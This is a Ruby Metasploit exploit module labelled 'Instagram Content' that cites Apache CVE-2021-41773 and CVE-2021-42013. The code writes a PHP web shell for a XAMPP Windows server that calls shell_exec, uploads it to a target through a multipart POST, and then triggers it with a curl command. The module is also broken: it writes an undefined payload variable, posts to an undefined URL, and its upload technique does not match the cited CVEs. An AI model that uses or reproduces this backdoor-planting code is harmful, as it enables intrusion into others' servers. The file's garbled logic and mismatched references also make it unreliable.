require 'msf/core'


class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpClient


    def initialize(info = {})

        super(
            update_info(info,

                'Name'           => 'Instagram Content',
                'Description'    => 'Instagram Content',
                'License'        =>  MSF_LICENSE,
                'Author'         =>
                    [
                        '@otw.mastah'
                    ],
                'References'     =>
                    [
                        ['CVE', '2021-41773'],
                        ['CVE', '2021-42013'],
                    ],
                'Platform'       => ['win'],
                'Targets'        =>
                    [
                        ['Universal', {}]
                    ],
                'DisclosureDate' => 'Oct 06 2021',
                'DefaultTarget'  => 0

            )
        )


        register_options([

            # host and port
            OptAddress.new('HOST_TARGET', [true, 'host address (example : 127.0.0.1)', '127.0.0.1']),
            OptInt.new('PORT_TARGET',  [true, 'port address (example : 80)', 80]),

            # url target
            OptString.new('TARGETURI', [true, 'url path (example : /api/v1/)', '/']),

            # exploit location
            OptString.new('EXPLOIT_LOCATION', [true, 'url path (example : /api/v1/uploads)', '/'])

        ], self.class)

    end


    def create_exploit(backdoor_name)
        backdoor_code = '#!"C:\\xampp\\php\\php.exe"\n<?php\necho "Content-type: text/plain; charset=iso-8859-1\n\n";\necho shell_exec("dir");\n?>'

        File.write(backdoor_name, payload_code)
    end


    def exploit
        # create backdoor
        backdoor_name = "qwerty.txt"
        create_exploit(backdoor_name)

        # parsing url target
        url_target = "http://#{datastore['HOST_TARGET']}:#{datastore['PORT_TARGET']}#{target_uri.path}"
        url_parse  = URI.parse(url_target)

        # send exploit to target
        File.open("./#{backdoor_name}") do | backdoor |
            request = Net::HTTP::Post::Multipart.new url.path,
                "file" => UploadIO.new(
                    backdoor,
                    "multipart/form-data",
                    backdoor_name
                )
          
            response = Net::HTTP.start(url_parse.host, url_parse.port) do | http |
                http.request(request)
            end
        end

        system(
            "curl http://#{datastore['HOST_TARGET']}:#{datastore['PORT_TARGET']}#{datastore['EXPLOIT_LOCATION']}"
        )

    end


end